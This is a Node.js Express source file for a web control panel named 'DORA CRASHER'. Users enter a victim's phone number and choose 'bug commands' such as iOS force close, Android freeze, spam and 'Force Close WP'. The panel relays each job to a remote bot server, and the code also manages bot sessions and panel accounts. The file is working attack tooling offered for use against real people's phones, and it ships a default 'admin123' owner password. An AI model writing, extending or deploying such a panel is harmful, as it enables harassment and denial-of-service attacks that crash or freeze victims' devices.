const express = require("express");
const session = require("express-session");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const bcrypt = require("bcryptjs");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

const CONFIG_FILE = path.join(__dirname, "webConfig.json");
const USERS_FILE = path.join(__dirname, "webusers.json");

let config = { botApiUrl: "", botApiKey: "" };

function loadConfig() {
    if (fs.existsSync(CONFIG_FILE)) {
        try {
            config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
        } catch (e) {}
    }
    if (process.env.BOT_API_URL) config.botApiUrl = process.env.BOT_API_URL.replace(/\/$/, "");
    if (process.env.BOT_API_KEY) config.botApiKey = process.env.BOT_API_KEY;
}

function saveConfig() {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

loadConfig();

if (!fs.existsSync(USERS_FILE)) {
    const hash = bcrypt.hashSync("admin123", 10);
    fs.writeFileSync(USERS_FILE, JSON.stringify([{ username: "admin", password: hash, role: "owner" }], null, 2));
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
    secret: process.env.SESSION_SECRET || "dora-secret-change-me",
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

function requireLogin(req, res, next) {
    if (req.session.user) return next();
    res.redirect("/login");
}

function requireOwner(req, res, next) {
    if (req.session.user && req.session.user.role === "owner") return next();
    res.status(403).json({ success: false, message: "Access denied" });
}

const CSS = `
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter','Segoe UI',sans-serif}
body{background:#050507;color:#fff;min-height:100vh;overflow-x:hidden}
body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 20%,rgba(255,0,60,0.12),transparent 40%),radial-gradient(circle at 80% 80%,rgba(120,0,255,0.1),transparent 40%);pointer-events:none;z-index:0}
.center{display:flex;align-items:center;justify-content:center;min-height:100vh;position:relative;z-index:1}
.box{background:rgba(17,17,22,0.85);backdrop-filter:blur(20px);padding:48px 40px;border-radius:20px;border:1px solid rgba(255,0,60,0.25);width:92%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.6),0 0 80px rgba(255,0,60,0.08)}
.logo{text-align:center;margin-bottom:32px}
.logo-icon{font-size:42px;display:block;margin-bottom:12px;filter:drop-shadow(0 0 20px rgba(255,0,60,0.5))}
.logo h1{color:#ff0033;font-size:20px;letter-spacing:4px;font-weight:800}
.logo p{color:#555;font-size:11px;letter-spacing:3px;margin-top:6px}
label{display:block;color:#888;font-size:11px;margin-bottom:8px;letter-spacing:1.5px;text-transform:uppercase;font-weight:600}
input,select{width:100%;padding:14px 16px;background:rgba(20,20,25,0.9);border:1px solid #222;border-radius:10px;color:#fff;font-size:14px;transition:all .2s}
input:focus,select:focus{outline:none;border-color:#ff0033;box-shadow:0 0 0 3px rgba(255,0,60,0.15)}
input::placeholder{color:#444}
.btn{width:100%;padding:15px;margin-top:22px;background:linear-gradient(135deg,#ff0033,#cc0029);border:none;border-radius:10px;color:#fff;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:2px;transition:all .2s;box-shadow:0 8px 24px rgba(255,0,60,0.3)}
.btn:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(255,0,60,0.4)}
.btn:disabled{background:#222;cursor:not-allowed;transform:none;box-shadow:none}
.btn-green{background:linear-gradient(135deg,#00c853,#009624);box-shadow:0 8px 24px rgba(0,200,83,0.3)}
.btn-green:hover{box-shadow:0 12px 32px rgba(0,200,83,0.4)}
.err{color:#ff3355;text-align:center;margin-top:14px;font-size:13px;padding:10px;background:rgba(255,0,60,0.08);border-radius:8px}
.ok{color:#00e676;text-align:center;margin-top:14px;font-size:13px;padding:10px;background:rgba(0,200,83,0.08);border-radius:8px}
.tag{text-align:center;color:#333;font-size:10px;margin-top:24px;letter-spacing:2px}
.header{display:flex;justify-content:space-between;align-items:center;padding:18px 28px;background:rgba(17,17,22,0.85);backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,0,60,0.2);position:sticky;top:0;z-index:100}
.header h1{color:#ff0033;font-size:15px;letter-spacing:3px;font-weight:800}
.header .user{display:flex;align-items:center;gap:12px;font-size:12px;color:#888}
.badge{padding:5px 12px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:1.5px}
.badge-owner{background:linear-gradient(135deg,#ff0033,#cc0029);color:#fff;box-shadow:0 0 20px rgba(255,0,60,0.4)}
.badge-user{background:#222;color:#888}
.logout{color:#ff0033;text-decoration:none;font-size:11px;letter-spacing:1.5px;font-weight:600}
.container{max-width:720px;margin:0 auto;padding:32px 20px;position:relative;z-index:1}
.card{background:rgba(17,17,22,0.7);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.05);border-radius:16px;padding:28px;margin-bottom:20px}
.card h2{color:#fff;font-size:13px;letter-spacing:2px;font-weight:700;margin-bottom:20px;display:flex;align-items:center;gap:10px;text-transform:uppercase}
.card h2::before{content:'';width:3px;height:16px;background:linear-gradient(180deg,#ff0033,#cc0029);border-radius:2px}
.field{margin-bottom:18px}
.field:last-child{margin-bottom:0}
.result{margin-top:18px;padding:16px;background:rgba(0,0,0,0.4);border-left:3px solid #ff0033;border-radius:8px;font-family:monospace;font-size:12px;color:#00e676;white-space:pre-wrap;word-break:break-all;line-height:1.6}
.sessions-grid{display:grid;grid-template-columns:1fr;gap:10px;margin-top:8px}
.session-item{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:rgba(0,0,0,0.3);border:1px solid #222;border-radius:10px;cursor:pointer;transition:all .2s}
.session-item:hover{border-color:rgba(255,0,60,0.3);background:rgba(255,0,60,0.04)}
.session-item.selected{border-color:#ff0033;background:rgba(255,0,60,0.1);box-shadow:0 0 0 2px rgba(255,0,60,0.15)}
.session-item .id{font-family:monospace;font-size:12px;color:#ccc;word-break:break-all;flex:1}
.session-item .status{font-size:10px;padding:4px 10px;border-radius:12px;font-weight:700;margin-left:10px}
.status-on{background:rgba(0,200,83,0.15);color:#00e676;border:1px solid rgba(0,200,83,0.3)}
.status-off{background:rgba(255,0,60,0.1);color:#ff3355;border:1px solid rgba(255,0,60,0.3)}
.session-check{width:18px;height:18px;border:2px solid #333;border-radius:5px;margin-right:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.session-item.selected .session-check{background:#ff0033;border-color:#ff0033}
.session-item.selected .session-check::after{content:'✓';color:#fff;font-size:12px;font-weight:bold}
.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px}
.btn-sm{padding:12px;background:rgba(255,255,255,0.05);border:1px solid #222;border-radius:10px;color:#fff;font-size:11px;font-weight:600;cursor:pointer;letter-spacing:1.5px;text-transform:uppercase}
.btn-sm:hover{border-color:#ff0033;background:rgba(255,0,60,0.08)}
.sel-info{margin-top:12px;padding:12px 16px;background:rgba(0,200,83,0.08);border:1px solid rgba(0,200,83,0.25);border-radius:10px;font-size:12px;color:#00e676;font-weight:600}
.loader{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin-right:8px;vertical-align:middle}
@keyframes spin{to{transform:rotate(360deg)}}
.config-box{font-family:monospace;font-size:11px;background:rgba(0,0,0,0.5);padding:14px;border-radius:8px;color:#00e676;word-break:break-all;line-height:1.8}
.config-box .label{color:#888;font-weight:600}
@media(max-width:520px){.header{padding:14px 16px}.header h1{font-size:12px}.card{padding:20px}}
`;

function loginPage(err) {
    return `<!DOCTYPE html><html><head><title>DORA CRASHER</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>${CSS}</style></head>
<body>
<div class="center">
<div class="box">
<div class="logo">
<span class="logo-icon">💀</span>
<h1>DORA CRASHER</h1>
<p>CONTROL PANEL</p>
</div>
<form method="POST" action="/login">
<label>Username</label>
<input type="text" name="username" placeholder="Enter username" required autofocus>
<label style="margin-top:16px;">Password</label>
<input type="password" name="password" placeholder="Enter password" required>
<button type="submit" class="btn">LOGIN</button>
</form>
${err ? '<div class="err">Invalid credentials</div>' : ''}
<div class="tag">OWNER @UnknownGuy9876 • @SGCodexs</div>
</div>
</div>
</body></html>`;
}

app.get("/", (req, res) => res.redirect("/login"));
app.get("/login", (req, res) => res.send(loginPage(req.query.err)));

app.post("/login", (req, res) => {
    const { username, password } = req.body;
    const users = JSON.parse(fs.readFileSync(USERS_FILE, "utf8"));
    const user = users.find(u => u.username === username);
    if (!user || !bcrypt.compareSync(password, user.password)) return res.redirect("/login?err=1");
    req.session.user = { username: user.username, role: user.role };
    res.redirect("/dashboard");
});

app.get("/logout", (req, res) => {
    req.session.destroy();
    res.redirect("/login");
});

app.get("/dashboard", requireLogin, (req, res) => {
    const isOwner = req.session.user.role === "owner";
    res.send(`<!DOCTYPE html><html><head><title>DORA CRASHER</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>${CSS}</style></head>
<body>
<div class="header">
<h1>💀 DORA CRASHER</h1>
<div class="user">
${req.session.user.username}
<span class="badge ${isOwner ? 'badge-owner' : 'badge-user'}">${isOwner ? 'OWNER' : 'USER'}</span>
<a href="/logout" class="logout">LOGOUT</a>
</div>
</div>
<div class="container">

${isOwner ? `
<div class="card">
<h2>Bot API Config</h2>
<div id="configBox" class="config-box">
<div><span class="label">URL:</span> <span id="cfgUrl">${config.botApiUrl || "Not set"}</span></div>
<div><span class="label">KEY:</span> <span id="cfgKey">${config.botApiKey ? config.botApiKey.substring(0, 20) + "..." : "Not set"}</span></div>
</div>
<div class="btn-row">
<button class="btn-sm" onclick="autoDetect()">AUTO DETECT</button>
<button class="btn-sm" onclick="testConnection()">TEST</button>
</div>
<div id="cfgResult" class="result" style="display:none;"></div>
</div>
` : ''}

${isOwner ? `
<div class="card">
<h2>Session Control</h2>
<div id="sessionsList">
<div style="text-align:center;padding:20px;color:#555;font-size:12px;"><span class="loader"></span> Loading sessions...</div>
</div>
<div class="btn-row">
<button class="btn-sm" onclick="loadSessions()">REFRESH</button>
<button class="btn-sm" onclick="selectAll()">SELECT ALL</button>
</div>
<div class="btn-row">
<button class="btn-sm" onclick="selectDefault()">DEFAULT</button>
<button class="btn-sm" onclick="saveSelection()" style="background:rgba(0,200,83,0.15);border-color:rgba(0,200,83,0.4);color:#00e676;">SAVE</button>
</div>
<div id="selInfo" class="sel-info" style="display:none;"></div>
</div>
` : ''}

<div class="card">
<h2>Execute Bug</h2>
<div class="field">
<label>Target Number</label>
<input type="text" id="target" placeholder="947xxxxxxxx" autocomplete="off">
</div>
<div class="field">
<label>Bug Command</label>
<select id="command">
<option value="IOSCRASH">IOSCRASH - iOS Force Close</option>
<option value="DORAIOS">DORAIOS - Infinite iOS Stuck</option>
<option value="frezewa">frezewa - Android Freeze</option>
<option value="fcbeta">fcbeta - Android Delay Beta</option>
<option value="andro">andro - Android Spam</option>
<option value="DelayHard">DelayHard - Close X Freeze</option>
<option value="buldozer">buldozer - Android Buldozer</option>
<option value="hima">hima - Fcinvisible</option>
<option value="DoraFc">DoraFc - Force Close WP</option>
</select>
</div>
<button class="btn" id="execBtn" onclick="execute()">EXECUTE BUG</button>
<div id="result" class="result" style="display:none;"></div>
</div>

${isOwner ? `
<div class="card">
<h2>Owner Control</h2>
<div class="field"><label>Username</label><input type="text" id="newUser" placeholder="New username"></div>
<div class="field"><label>Password</label><input type="password" id="newPass" placeholder="New password"></div>
<div class="field"><label>Role</label>
<select id="newRole"><option value="user">User</option><option value="owner">Owner</option></select>
</div>
<button class="btn btn-green" onclick="addUser()">ADD USER</button>
<div id="adminResult" class="result" style="display:none;"></div>
</div>
` : ''}

</div>
<script>
var selectedSessions = [];
var allSessions = [];

async function autoDetect(){
var r=document.getElementById('cfgResult');
r.style.display='block';r.style.color='#ffaa00';r.textContent='Detecting bot server...';
try{
var res=await fetch('/admin/auto-detect',{method:'POST'});
var d=await res.json();
r.style.color=d.success?'#00e676':'#ff3355';
r.textContent=d.message;
if(d.success){
document.getElementById('cfgUrl').textContent=d.url;
document.getElementById('cfgKey').textContent=d.key.substring(0,20)+'...';
}
}catch(e){r.style.color='#ff3355';r.textContent='Error: '+e.message}
}

async function testConnection(){
var r=document.getElementById('cfgResult');
r.style.display='block';r.style.color='#ffaa00';r.textContent='Testing...';
try{
var res=await fetch('/admin/test-connection',{method:'POST'});
var d=await res.json();
r.style.color=d.success?'#00e676':'#ff3355';
r.textContent=d.message;
}catch(e){r.style.color='#ff3355';r.textContent='Error: '+e.message}
}

async function loadSessions(){
var list=document.getElementById('sessionsList');
list.innerHTML='<div style="text-align:center;padding:20px;color:#555;font-size:12px;"><span class="loader"></span> Loading...</div>';
try{
var res=await fetch('/api/sessions');
var d=await res.json();
if(!d.success){list.innerHTML='<div class="err">'+d.message+'</div>';return;}
allSessions=d.sessions;
selectedSessions=d.selected||[];
renderSessions();
}catch(e){list.innerHTML='<div class="err">Error: '+e.message+'</div>';}
}

function renderSessions(){
var list=document.getElementById('sessionsList');
if(!allSessions.length){list.innerHTML='<div style="text-align:center;padding:20px;color:#555;font-size:12px;">No sessions found</div>';return;}
var h='<div class="sessions-grid">';
allSessions.forEach(function(s){
var on=s.status==='open';
var sel=selectedSessions.indexOf(s.id)!==-1;
h+='<div class="session-item '+(sel?'selected':'')+'" onclick="toggleSession(\\''+s.id+'\\')">';
h+='<div class="session-check"></div>';
h+='<div class="id">'+s.id+'</div>';
h+='<div class="status '+(on?'status-on':'status-off')+'">'+(on?'ONLINE':'OFFLINE')+'</div>';
h+='</div>';
});
h+='</div>';
list.innerHTML=h;
updateInfo();
}

function toggleSession(id){
var i=selectedSessions.indexOf(id);
if(i===-1)selectedSessions.push(id);else selectedSessions.splice(i,1);
renderSessions();
}

function selectAll(){selectedSessions=allSessions.map(function(s){return s.id;});renderSessions();}
function selectDefault(){selectedSessions=[];renderSessions();}

async function saveSelection(){
try{
var res=await fetch('/api/select-sessions',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessions:selectedSessions})});
var d=await res.json();
document.getElementById('selInfo').style.display='block';
document.getElementById('selInfo').style.color=d.success?'#00e676':'#ff3355';
document.getElementById('selInfo').textContent=d.message;
}catch(e){}
}

function updateInfo(){
var info=document.getElementById('selInfo');
if(selectedSessions.length){info.style.display='block';info.textContent='Selected: '+selectedSessions.length+' session(s)';}
else{info.style.display='none';}
}

async function execute(){
var t=document.getElementById('target').value.trim();
var c=document.getElementById('command').value;
var b=document.getElementById('execBtn');
var r=document.getElementById('result');
if(!t){r.style.display='block';r.style.color='#ff3355';r.textContent='Enter target number';return}
b.disabled=true;b.innerHTML='<span class="loader"></span>EXECUTING';
r.style.display='block';r.style.color='#ffaa00';r.textContent='Sending...';
try{
var res=await fetch('/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:t,command:c})});
var d=await res.json();
r.style.color=d.success?'#00e676':'#ff3355';r.textContent=d.message;
}catch(e){r.style.color='#ff3355';r.textContent='Error: '+e.message}
b.disabled=false;b.textContent='EXECUTE BUG';
}

async function addUser(){
var u=document.getElementById('newUser').value.trim();
var p=document.getElementById('newPass').value.trim();
var ro=document.getElementById('newRole').value;
var o=document.getElementById('adminResult');
if(!u||!p){o.style.display='block';o.style.color='#ff3355';o.textContent='Fill all fields';return}
try{
var res=await fetch('/admin/adduser',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p,role:ro})});
var d=await res.json();
o.style.display='block';o.style.color=d.success?'#00e676':'#ff3355';o.textContent=d.message;
}catch(e){o.style.display='block';o.style.color='#ff3355';o.textContent='Error: '+e.message}
}

${isOwner ? 'loadSessions();' : ''}
</script>
</body></html>`);
});

app.post("/execute", requireLogin, async (req, res) => {
    const { target, command } = req.body;
    if (!target || !command) return res.json({ success: false, message: "Missing target or command" });
    const cleanTarget = target.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) return res.json({ success: false, message: "Invalid number" });
    if (!config.botApiUrl || !config.botApiKey) return res.json({ success: false, message: "Bot API not configured. Use Auto Detect." });

    try {
        await axios.post(config.botApiUrl + "/api/execute",
            { target: cleanTarget, command, user: req.session.user.username },
            { headers: { "x-api-key": config.botApiKey, "Content-Type": "application/json" }, timeout: 15000 }
        );
        res.json({ success: true, message: "Job sent\nTarget: " + cleanTarget + "\nCommand: /" + command });
    } catch (e) {
        const m = e.response && e.response.data && e.response.data.message ? e.response.data.message : e.message;
        res.json({ success: false, message: "Bot server error: " + m });
    }
});

app.get("/api/sessions", requireLogin, requireOwner, async (req, res) => {
    if (!config.botApiUrl || !config.botApiKey) return res.json({ success: false, message: "Bot API not configured" });
    try {
        const r = await axios.get(config.botApiUrl + "/api/sessions", {
            headers: { "x-api-key": config.botApiKey }, timeout: 10000
        });
        res.json(r.data);
    } catch (e) {
        const m = e.response && e.response.data && e.response.data.message ? e.response.data.message : e.message;
        res.json({ success: false, message: "Bot server error: " + m });
    }
});

app.post("/api/select-sessions", requireLogin, requireOwner, async (req, res) => {
    if (!config.botApiUrl || !config.botApiKey) return res.json({ success: false, message: "Bot API not configured" });
    try {
        const r = await axios.post(config.botApiUrl + "/api/select-sessions",
            { sessions: req.body.sessions || [] },
            { headers: { "x-api-key": config.botApiKey, "Content-Type": "application/json" }, timeout: 10000 }
        );
        res.json(r.data);
    } catch (e) {
        const m = e.response && e.response.data && e.response.data.message ? e.response.data.message : e.message;
        res.json({ success: false, message: "Bot server error: " + m });
    }
});

app.post("/admin/auto-detect", requireOwner, async (req, res) => {
    const { botUrl, botKey } = req.body;

    if (botUrl && botKey) {
        config.botApiUrl = botUrl.replace(/\/$/, "");
        config.botApiKey = botKey;
        saveConfig();
        return res.json({ success: true, message: "Config saved", url: config.botApiUrl, key: config.botApiKey });
    }

    const envUrl = process.env.BOT_API_URL;
    if (envUrl) {
        config.botApiUrl = envUrl.replace(/\/$/, "");
        if (process.env.BOT_API_KEY) config.botApiKey = process.env.BOT_API_KEY;
        saveConfig();
        return res.json({ success: true, message: "Loaded from Render env", url: config.botApiUrl, key: config.botApiKey });
    }

    return res.json({ success: false, message: "Please set BOT_API_URL and BOT_API_KEY in Render environment, then redeploy" });
});

app.post("/admin/save-config", requireOwner, (req, res) => {
    const { botUrl, botKey } = req.body;
    if (!botUrl || !botKey) return res.json({ success: false, message: "Fill both fields" });
    config.botApiUrl = botUrl.replace(/\/$/, "");
    config.botApiKey = botKey;
    saveConfig();
    res.json({ success: true, message: "Config saved", url: config.botApiUrl, key: config.botApiKey });
});

app.post("/admin/test-connection", requireOwner, async (req, res) => {
    if (!config.botApiUrl || !config.botApiKey) return res.json({ success: false, message: "Config not set" });
    try {
        const r = await axios.get(config.botApiUrl + "/api/health", { timeout: 8000 });
        res.json({ success: true, message: "Bot server online\n" + JSON.stringify(r.data) });
    } catch (e) {
        const m = e.response && e.response.data && e.response.data.message ? e.response.data.message : e.message;
        res.json({ success: false, message: "Connection failed: " + m });
    }
});

app.post("/admin/adduser", requireOwner, (req, res) => {
    const { username, password, role } = req.body;
    if (!username || !password) return res.json({ success: false, message: "Fill all fields" });
    const users = JSON.parse(fs.readFileSync(USERS_FILE, "utf8"));
    if (users.find(u => u.username === username)) return res.json({ success: false, message: "Username exists" });
    const hash = bcrypt.hashSync(password, 10);
    users.push({ username, password: hash, role: role || "user" });
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
    res.json({ success: true, message: "User " + username + " added as " + (role || "user") });
});

app.listen(PORT, () => console.log("WEB PANEL ON PORT " + PORT));
